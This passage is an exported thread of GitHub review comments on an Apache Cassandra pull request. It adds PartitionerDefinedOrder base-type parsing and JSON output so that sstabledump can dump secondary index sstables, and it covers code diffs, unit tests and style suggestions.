+        IPartitioner partitioner = FBUtilities.newPartitioner(k);
+        AbstractType<?> type = partitioner.partitionOrdering();
+        if (partitioner.partitionOrdering() instanceof PartitionerDefinedOrder)
+        {
+            PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) partitioner.partitionOrdering();
+            ++idx;
+            try
+            {
+                type = tmp.withBaseType(parse());
+            }
+            catch (Throwable throwable)
+            {
+                Iterator<String> argIterator = this.getKeyValueParameters().keySet().iterator();

Review Comment:
   Some modification is made for this review. This time I just use what you have said. """"PartitionerDefinedOrder(%s)"" can be handled more easily by just checking if : was seen. If not, just return type. If yes, then ((PartitionerDefinedOrder)type).withBaseType(parse()) must succeed.""
   For me ,at first I am not sure of the existence of different type's string to be parse. So I re-use the original  way of Typeparse, so if the string that is not in the format of PartitionerDefinedOrder(<partitioner>:<baseType>) , the original parse will be used.
     



;09/Jan/23 09:24;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1064447602


##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -130,6 +138,73 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext()) {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+    
+    //the format is (partitioner:type)
+    public AbstractType<?> getPartitionerDefinedOrder()
+    {
+        if (isEOS())
+            return defaultParsePartitionOrdering(this);
+        skipBlank();
+        if (str.charAt(idx) != '(')
+            throw new IllegalStateException();
+        Pair<Boolean, AbstractType<?>>  result = null;
+        ++idx; // skipping '('
+
+        if (str.charAt(idx) == ')')
+        {
+            ++idx;
+            return  defaultParsePartitionOrdering(this);
+        }
+        skipBlank();
+        String k = readNextIdentifier();
+        skipBlank();
+        if (str.charAt(idx) == ':')
+        {
+            ++idx;
+            skipBlank();
+        }
+        else if (str.charAt(idx) != ',' && str.charAt(idx) != ')')
+        {
+            return defaultParsePartitionOrdering(this);
+        }
+        IPartitioner partitioner = FBUtilities.newPartitioner(k);
+        AbstractType<?> type = partitioner.partitionOrdering();
+        if (partitioner.partitionOrdering() instanceof PartitionerDefinedOrder)

Review Comment:
   I modify the code , and left some comment around this place . For format ""PartitionerDefinedOrder(partitioner)"" I set the idx with the initIdx and  re-use the original way of parse here . But at first a partitioner.partitionOrdering() was just retrun . Finally I change to the original way of parse for I am not sure if some other corner case may exist?



;09/Jan/23 09:49;githubbot;600","blambov commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1067170625


##########
src/java/org/apache/cassandra/tools/JsonTransformer.java:
##########
@@ -349,7 +350,12 @@ private void serializeClustering(ClusteringPrefix clustering) throws IOException
                 }
                 else
                 {
-                    json.writeRawValue(column.cellValueType().toJSONString(clustering.get(i), Server.CURRENT_VERSION));
+                    AbstractType<?> type = column.cellValueType();
+                    if (type instanceof PartitionerDefinedOrder)

Review Comment:
   Is this special case necessary when `PartitionerDefinedOrder` implements `toJSONString`?



##########
src/java/org/apache/cassandra/index/internal/CassandraIndex.java:
##########
@@ -765,6 +766,13 @@ public static final CFMetaData indexCfsMetadata(CFMetaData baseCfsMetadata, Inde
         ColumnDefinition indexedColumn = target.left;
         AbstractType<?> indexedValueType = utils.getIndexedValueType(indexedColumn);
 
+        AbstractType<?> indexTableMokePkType =  baseCfsMetadata.partitioner.partitionOrdering();

Review Comment:
   Nit: `MokePk` is rather unclear. Maybe call this `indexedTablePartitionKeyType`?



;11/Jan/23 16:10;githubbot;600","blambov commented on PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#issuecomment-1379050383

   The latest parser code looks much better, thank you for the patience.


;11/Jan/23 16:10;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1067753793


##########
src/java/org/apache/cassandra/index/internal/CassandraIndex.java:
##########
@@ -765,6 +766,13 @@ public static final CFMetaData indexCfsMetadata(CFMetaData baseCfsMetadata, Inde
         ColumnDefinition indexedColumn = target.left;
         AbstractType<?> indexedValueType = utils.getIndexedValueType(indexedColumn);
 
+        AbstractType<?> indexTableMokePkType =  baseCfsMetadata.partitioner.partitionOrdering();

Review Comment:
   ok



;12/Jan/23 06:42;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1067761654


##########
src/java/org/apache/cassandra/tools/JsonTransformer.java:
##########
@@ -349,7 +350,12 @@ private void serializeClustering(ClusteringPrefix clustering) throws IOException
                 }
                 else
                 {
-                    json.writeRawValue(column.cellValueType().toJSONString(clustering.get(i), Server.CURRENT_VERSION));
+                    AbstractType<?> type = column.cellValueType();
+                    if (type instanceof PartitionerDefinedOrder)

Review Comment:
   yeah，I think this should remove for PartitionerDefinedOrder have already got toJSONString



;12/Jan/23 06:56;githubbot;600","Maxwell-Guo opened a new pull request, #2094:
URL: https://github.com/apache/cassandra/pull/2094

   sstabledump errors when dumping data from index  CASSANDRA-17698
   
   ```
   <One sentence description, usually Jira title or CHANGES.txt summary>
   
   <Optional lengthier description (context on patch)>
   
   patch by <maxwellguo>; for CASSANDRA-17698
   
   
   ```
   
   The [Cassandra 17698](https://issues.apache.org/jira/browse/CASSANDRA-17698)
   
   


;13/Jan/23 08:56;githubbot;600","Maxwell-Guo closed pull request #2094: sstabledump errors when dumping data from index  CASSANDRA-17698
URL: https://github.com/apache/cassandra/pull/2094


;13/Jan/23 14:02;githubbot;600","adelapena commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1072323177


##########
src/java/org/apache/cassandra/index/internal/CassandraIndexFunctions.java:
##########
@@ -20,13 +20,22 @@
 
 import java.util.List;
 
+import com.datastax.driver.core.ColumnMetadata;

Review Comment:
   Nit: unused import



##########
src/java/org/apache/cassandra/index/internal/CassandraIndex.java:
##########
@@ -765,6 +766,13 @@ public static final CFMetaData indexCfsMetadata(CFMetaData baseCfsMetadata, Inde
         ColumnDefinition indexedColumn = target.left;
         AbstractType<?> indexedValueType = utils.getIndexedValueType(indexedColumn);
 
+        AbstractType<?> indexedTablePartitionKeyType =  baseCfsMetadata.partitioner.partitionOrdering();
+        if(indexedTablePartitionKeyType instanceof PartitionerDefinedOrder)

Review Comment:
   ```suggestion
           if (indexedTablePartitionKeyType instanceof PartitionerDefinedOrder)
   ```



##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -130,6 +138,59 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)

Review Comment:
   ```suggestion
        * Parse PartitionOrdering from old version of PartitionOrdering' string format.
        */
       private static AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
   ```



##########
src/java/org/apache/cassandra/index/internal/CassandraIndexFunctions.java:
##########
@@ -142,6 +156,22 @@ public AbstractType<?> getIndexedValueType(ColumnDefinition indexedColumn)
         {
             return ((CollectionType) indexedColumn.type).nameComparator();
         }
+
+        @Override
+        public AbstractType<?> getIndexedPartitionKeyType(ColumnDefinition indexedColumn)
+        {
+            assert indexedColumn.type.isCollection() ;
+            switch (((CollectionType)indexedColumn.type).kind)
+            {
+                case LIST:
+                    return ((ListType)indexedColumn.type).getElementsType();
+                case SET:
+                    return ((SetType)indexedColumn.type).getElementsType();
+                case MAP:
+                    return ((MapType)indexedColumn.type).getKeysType();
+            }

Review Comment:
   ```suggestion
               switch (((CollectionType<?>) indexedColumn.type).kind)
               {
                   case LIST:
                       return ((ListType<?>) indexedColumn.type).getElementsType();
                   case SET:
                       return ((SetType<?>) indexedColumn.type).getElementsType();
                   case MAP:
                       return ((MapType<?, ?>) indexedColumn.type).getKeysType();
               }
   ```



##########
src/java/org/apache/cassandra/index/internal/CassandraIndex.java:
##########
@@ -765,6 +766,13 @@ public static final CFMetaData indexCfsMetadata(CFMetaData baseCfsMetadata, Inde
         ColumnDefinition indexedColumn = target.left;
         AbstractType<?> indexedValueType = utils.getIndexedValueType(indexedColumn);
 
+        AbstractType<?> indexedTablePartitionKeyType =  baseCfsMetadata.partitioner.partitionOrdering();
+        if(indexedTablePartitionKeyType instanceof PartitionerDefinedOrder)
+        {
+            PartitionerDefinedOrder tmp =  (PartitionerDefinedOrder)indexedTablePartitionKeyType;

Review Comment:
   ```suggestion
               PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) indexedTablePartitionKeyType;
   ```



##########
test/unit/org/apache/cassandra/db/marshal/TypeParserTest.java:
##########
@@ -98,4 +102,173 @@ public void testParsePartitionerOrder() throws ConfigurationException, SyntaxExc
         }
         assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
     }
+
+    @Test
+    public void testParsePartitionerOrderWithBaseType() throws ConfigurationException, SyntaxException
+    {
+        // default partitioner
+        assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
+        
+        // PartitionerDefinedOrder's base type is not composite type
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                type = tmp.withBaseType(Int32Type.instance);
+            }
+            System.out.println(type.toString());
+            assertEquals(type, TypeParser.parse(type.toString()));
+        }
+        // PartitionerDefinedOrder's base type is  composite type
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                type = tmp.withBaseType(CompositeType.getInstance(Int32Type.instance, UTF8Type.instance));
+            }
+            System.out.println(type.toString());
+            assertEquals(type, TypeParser.parse(type.toString()));
+        }
+        // PartitionerDefinedOrder's base type is  tuple type
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                type = tmp.withBaseType(new TupleType(Lists.newArrayList(Int32Type.instance, UTF8Type.instance)));
+            }
+            System.out.println(type.toString());
+            assertEquals(type, TypeParser.parse(type.toString()));
+        }
+        // PartitionerDefinedOrder's base type is  ReversedType
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                type = tmp.withBaseType(ReversedType.getInstance(Int32Type.instance));
+            }
+            System.out.println(type.toString());
+            assertEquals(type, TypeParser.parse(type.toString()));
+        }
+        // PartitionerDefinedOrder's base type is  CollectionType
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                type = tmp.withBaseType(MapType.getInstance(Int32Type.instance, UTF8Type.instance, false));
+            }
+            System.out.println(type.toString());
+            assertEquals(type, TypeParser.parse(type.toString()));
+        }
+    }
+
+    @Test
+    public void testParsePartitionerOrderMistMatch() throws ConfigurationException, SyntaxException

Review Comment:
   This doesn't throw `ConfigurationException` nor `SyntaxException`. 



##########
src/java/org/apache/cassandra/db/marshal/AbstractCompositeType.java:
##########
@@ -248,6 +248,7 @@ public Term fromJSONObject(Object parsed)
     @Override
     public String toJSONString(ByteBuffer buffer, int protocolVersion)
     {
+        //TODO support toJSONString for AbstractCompositeType

Review Comment:
   ```suggestion
           // TODO support toJSONString for AbstractCompositeType
   ```



##########
src/java/org/apache/cassandra/tools/SSTableExport.java:
##########
@@ -119,6 +122,14 @@ public static CFMetaData metadataFromSSTable(Descriptor desc) throws IOException
         {
             builder.addClusteringColumn(""clustering"" + (i > 0 ? i : """"), header.getClusteringTypes().get(i));
         }
+
+        if (SecondaryIndexManager.isIndexColumnFamily(desc.cfname))
+        {
+            String index = SecondaryIndexManager.getIndexName(desc.cfname);
+            IndexMetadata indexMetadata =  IndexMetadata.fromSchemaMetadata(index, IndexMetadata.Kind.CUSTOM, null);

Review Comment:
   We don't really know if the index is `CUSTOM`, but in principle that doesn't seem relevant for this code path. Nevertheless I'd add a comment about it.



##########
src/java/org/apache/cassandra/tools/SSTableExport.java:
##########
@@ -119,6 +122,14 @@ public static CFMetaData metadataFromSSTable(Descriptor desc) throws IOException
         {
             builder.addClusteringColumn(""clustering"" + (i > 0 ? i : """"), header.getClusteringTypes().get(i));
         }
+
+        if (SecondaryIndexManager.isIndexColumnFamily(desc.cfname))
+        {
+            String index = SecondaryIndexManager.getIndexName(desc.cfname);
+            IndexMetadata indexMetadata =  IndexMetadata.fromSchemaMetadata(index, IndexMetadata.Kind.CUSTOM, null);

Review Comment:
   ```suggestion
               IndexMetadata indexMetadata = IndexMetadata.fromSchemaMetadata(index, IndexMetadata.Kind.CUSTOM, null);
   ```



##########
test/unit/org/apache/cassandra/db/marshal/TypeParserTest.java:
##########
@@ -98,4 +102,173 @@ public void testParsePartitionerOrder() throws ConfigurationException, SyntaxExc
         }
         assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
     }
+
+    @Test
+    public void testParsePartitionerOrderWithBaseType() throws ConfigurationException, SyntaxException
+    {
+        // default partitioner
+        assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
+        
+        // PartitionerDefinedOrder's base type is not composite type
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                type = tmp.withBaseType(Int32Type.instance);
+            }
+            System.out.println(type.toString());
+            assertEquals(type, TypeParser.parse(type.toString()));
+        }
+        // PartitionerDefinedOrder's base type is  composite type
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                type = tmp.withBaseType(CompositeType.getInstance(Int32Type.instance, UTF8Type.instance));
+            }
+            System.out.println(type.toString());
+            assertEquals(type, TypeParser.parse(type.toString()));
+        }
+        // PartitionerDefinedOrder's base type is  tuple type
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                type = tmp.withBaseType(new TupleType(Lists.newArrayList(Int32Type.instance, UTF8Type.instance)));
+            }
+            System.out.println(type.toString());
+            assertEquals(type, TypeParser.parse(type.toString()));
+        }
+        // PartitionerDefinedOrder's base type is  ReversedType
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                type = tmp.withBaseType(ReversedType.getInstance(Int32Type.instance));
+            }
+            System.out.println(type.toString());
+            assertEquals(type, TypeParser.parse(type.toString()));
+        }
+        // PartitionerDefinedOrder's base type is  CollectionType
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                type = tmp.withBaseType(MapType.getInstance(Int32Type.instance, UTF8Type.instance, false));
+            }
+            System.out.println(type.toString());
+            assertEquals(type, TypeParser.parse(type.toString()));
+        }
+    }
+
+    @Test
+    public void testParsePartitionerOrderMistMatch() throws ConfigurationException, SyntaxException
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                type = tmp.withBaseType(Int32Type.instance);
+                boolean result = partitioner.partitionOrdering().equals(TypeParser.parse(type.toString()));
+                assertFalse(result);
+            }
+            else
+            {
+                // ByteOrderedPartitioner.instance and OrderPreservingPartitioner.instance's partitionOrdering will not be PartitionerDefinedOrder
+                boolean result = partitioner.partitionOrdering().equals(TypeParser.parse(type.toString()));
+                assertTrue(result);
+            }
+
+        }
+        assertEquals(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
+    }
+    
+    @Test
+    public void testParsePartitionerOrderWithErrorFormat() 
+    {
+        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
+                                                            ByteOrderedPartitioner.instance,
+                                                            RandomPartitioner.instance,
+                                                            OrderPreservingPartitioner.instance })
+        {
+            AbstractType<?> type = partitioner.partitionOrdering();
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                // only Murmur3Partitioner and RandomPartitioner's partitionOrdering() are instanceof PartitionerDefinedOrder
+                String msgPartitioner = partitioner instanceof Murmur3Partitioner ? ""Murmur3Partitioner"" : ""RandomPartitioner"";
+                // error format PartitionerDefinedOrder(org.apache.cassandra.dht.Murmur3Partitioner,
+                String tmpStr1 =  type.toString().replace(')', ',');
+                try
+                {
+                    TypeParser.parse(tmpStr1);
+                    fail();
+                }
+                catch (Throwable t)
+                {
+                    String tmp = t.getCause().getMessage();
+                    System.out.println(tmp);

Review Comment:
   I'd remove the calls to `System.out.println`



##########
src/java/org/apache/cassandra/index/internal/CassandraIndexFunctions.java:
##########
@@ -168,6 +198,24 @@ public CFMetaData.Builder addIndexClusteringColumns(CFMetaData.Builder builder,
             builder.addClusteringColumn(""cell_path"", ((CollectionType)columnDef.type).nameComparator());
             return builder;
         }
+
+
+        @Override
+        public AbstractType<?> getIndexedPartitionKeyType(ColumnDefinition indexedColumn)
+        {
+            assert indexedColumn.type.isCollection() ;
+            switch (((CollectionType)indexedColumn.type).kind)
+            {
+                case LIST:
+                    return ((ListType)indexedColumn.type).getElementsType();
+                case SET:
+                    return ((SetType)indexedColumn.type).getElementsType();
+                case MAP:
+                    return ((MapType)indexedColumn.type).getValuesType();
+            }

Review Comment:
   ```suggestion
               switch (((CollectionType<?>) indexedColumn.type).kind)
               {
                   case LIST:
                       return ((ListType<?>) indexedColumn.type).getElementsType();
                   case SET:
                       return ((SetType<?>) indexedColumn.type).getElementsType();
                   case MAP:
                       return ((MapType<?, ?>) indexedColumn.type).getValuesType();
               }
   ```



##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
@@ -18,39 +18,43 @@
 package org.apache.cassandra.db.marshal;
 
 import java.nio.ByteBuffer;
-import java.util.Iterator;
 
-import org.apache.cassandra.config.DatabaseDescriptor;
 import org.apache.cassandra.cql3.Term;
 import org.apache.cassandra.db.PartitionPosition;
 import org.apache.cassandra.serializers.TypeSerializer;
 import org.apache.cassandra.serializers.MarshalException;
 import org.apache.cassandra.dht.IPartitioner;
 import org.apache.cassandra.utils.ByteBufferUtil;
-import org.apache.cassandra.utils.FBUtilities;
 
 /** for sorting columns representing row keys in the row ordering as determined by a partitioner.
  * Not intended for user-defined CFs, and will in fact error out if used with such. */
 public class PartitionerDefinedOrder extends AbstractType<ByteBuffer>
 {
     private final IPartitioner partitioner;
-
+    private final AbstractType<?> baseType;
+    

Review Comment:
   Nit: extra whitespaces
   ```suggestion
   
   ```



##########
test/unit/org/apache/cassandra/db/marshal/TypeParserTest.java:
##########
@@ -98,4 +102,173 @@ public void testParsePartitionerOrder() throws ConfigurationException, SyntaxExc
         }
         assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
     }
+
+    @Test
+    public void testParsePartitionerOrderWithBaseType() throws ConfigurationException, SyntaxException

Review Comment:
   This doesn't throw `ConfigurationException` nor `SyntaxException`. Also, there is some duplication in the method that can be mitigated with an auxiliary function:
   ```java
       @Test
       public void testParsePartitionerOrderWithBaseType()
       {
           // default partitioner
           assertSame(DatabaseDescriptor.getPartitioner().partitionOrdering(), TypeParser.parse(""PartitionerDefinedOrder""));
           
           // PartitionerDefinedOrder's base type is not composite type
           testParsePartitionerOrderWithBaseType(Int32Type.instance);
   
           // PartitionerDefinedOrder's base type is composite type
           testParsePartitionerOrderWithBaseType(CompositeType.getInstance(Int32Type.instance, UTF8Type.instance));
   
           // PartitionerDefinedOrder's base type is tuple type
           testParsePartitionerOrderWithBaseType(new TupleType(Lists.newArrayList(Int32Type.instance, UTF8Type.instance)));
   
           // PartitionerDefinedOrder's base type is ReversedType
           testParsePartitionerOrderWithBaseType(ReversedType.getInstance(Int32Type.instance));
   
           // PartitionerDefinedOrder's base type is CollectionType
           testParsePartitionerOrderWithBaseType(MapType.getInstance(Int32Type.instance, UTF8Type.instance, false));
       }
   
       private static void testParsePartitionerOrderWithBaseType(AbstractType<?> baseType)
       {
           for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
                                                               ByteOrderedPartitioner.instance,
                                                               RandomPartitioner.instance,
                                                               OrderPreservingPartitioner.instance })
           {
               AbstractType<?> type = partitioner.partitionOrdering();
               if (type instanceof PartitionerDefinedOrder)
               {
                   type = ((PartitionerDefinedOrder) type).withBaseType(baseType);
               }
               assertEquals(type, TypeParser.parse(type.toString()));
           }
       }
   ```



##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -130,6 +138,59 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+    /**
+     * parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static  AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext()) 
+        {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering();
+    }
+    
+    /**
+     * parse and return the real PartitionerDefinedOrder from the string variable str
+     * the str format can be like PartitionerDefinedOrder(<partitioner>) or
+     * PartitionerDefinedOrder(<partitioner>:<baseType>)
+     * */

Review Comment:
   ```suggestion
        * Parse and return the real {@link PartitionerDefinedOrder} from the string variable str
        * the str format can be like {@link PartitionerDefinedOrder#PartitionerDefinedOrder(IPartitioner)} or
        * {@link PartitionerDefinedOrder#PartitionerDefinedOrder(IPartitioner, AbstractType)}.
        */
   ```



;17/Jan/23 16:03;githubbot;600","adelapena commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1072619482


##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
@@ -84,7 +88,8 @@ public Term fromJSONObject(Object parsed)
     @Override
     public String toJSONString(ByteBuffer buffer, int protocolVersion)
     {
-        throw new UnsupportedOperationException();
+        assert baseType != null && !baseType.equals(this);

Review Comment:
   This assertion fails if we try to read an sstable that has been written before applying this patch



;17/Jan/23 18:20;githubbot;600","adelapena commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1072619482


##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
@@ -84,7 +88,8 @@ public Term fromJSONObject(Object parsed)
     @Override
     public String toJSONString(ByteBuffer buffer, int protocolVersion)
     {
-        throw new UnsupportedOperationException();
+        assert baseType != null && !baseType.equals(this);

Review Comment:
   This assertion fails if we try to read a sstable that has been written before applying this patch



;17/Jan/23 18:20;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1073246613


##########
src/java/org/apache/cassandra/tools/SSTableExport.java:
##########
@@ -119,6 +122,14 @@ public static CFMetaData metadataFromSSTable(Descriptor desc) throws IOException
         {
             builder.addClusteringColumn(""clustering"" + (i > 0 ? i : """"), header.getClusteringTypes().get(i));
         }
+
+        if (SecondaryIndexManager.isIndexColumnFamily(desc.cfname))
+        {
+            String index = SecondaryIndexManager.getIndexName(desc.cfname);
+            IndexMetadata indexMetadata =  IndexMetadata.fromSchemaMetadata(index, IndexMetadata.Kind.CUSTOM, null);

Review Comment:
   Yes, you are right, first time I do not know what kind of the index should be ,so I just set it with COUSTOM as I think this do not make any sense for the code path. But I think I can now get the index meta info from system table and return the finally result.



;18/Jan/23 08:47;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1073255634


##########
src/java/org/apache/cassandra/tools/SSTableExport.java:
##########
@@ -119,6 +122,14 @@ public static CFMetaData metadataFromSSTable(Descriptor desc) throws IOException
         {
             builder.addClusteringColumn(""clustering"" + (i > 0 ? i : """"), header.getClusteringTypes().get(i));
         }
+
+        if (SecondaryIndexManager.isIndexColumnFamily(desc.cfname))
+        {
+            String index = SecondaryIndexManager.getIndexName(desc.cfname);
+            IndexMetadata indexMetadata =  IndexMetadata.fromSchemaMetadata(index, IndexMetadata.Kind.CUSTOM, null);

Review Comment:
   @adelapena .It seems hard for this tool to open a query for cql to select the index meta system table. So any advice on the kind of index ? 



;18/Jan/23 08:56;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1073282205


##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
@@ -84,7 +88,8 @@ public Term fromJSONObject(Object parsed)
     @Override
     public String toJSONString(ByteBuffer buffer, int protocolVersion)
     {
-        throw new UnsupportedOperationException();
+        assert baseType != null && !baseType.equals(this);

Review Comment:
   if reading from a sstable generated from the version that do not contains this patch , the baseType will be null and a java.lang.AssertionError will return at this line . 
   



;18/Jan/23 09:20;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1073282205


##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
@@ -84,7 +88,8 @@ public Term fromJSONObject(Object parsed)
     @Override
     public String toJSONString(ByteBuffer buffer, int protocolVersion)
     {
-        throw new UnsupportedOperationException();
+        assert baseType != null && !baseType.equals(this);

Review Comment:
   if reading from a sstable generated from the version that do not contains this patch and dump index sstable using version contains this patch then the baseType will be null and a java.lang.AssertionError will return at this line . 
   
   if using a version that do not contains this patch , then an UnsupportedOperationException will be throw.
   



;18/Jan/23 09:23;githubbot;600","Maxwell-Guo commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1073325621


##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
@@ -84,7 +88,8 @@ public Term fromJSONObject(Object parsed)
     @Override
     public String toJSONString(ByteBuffer buffer, int protocolVersion)
     {
-        throw new UnsupportedOperationException();
+        assert baseType != null && !baseType.equals(this);

Review Comment:
   Add some tests for this 



;18/Jan/23 09:59;githubbot;600","adelapena commented on code in PR #1998:
URL: https://github.com/apache/cassandra/pull/1998#discussion_r1073454842


##########
src/java/org/apache/cassandra/tools/SSTableExport.java:
##########
@@ -119,6 +122,14 @@ public static CFMetaData metadataFromSSTable(Descriptor desc) throws IOException
         {
             builder.addClusteringColumn(""clustering"" + (i > 0 ? i : """"), header.getClusteringTypes().get(i));
         }
+
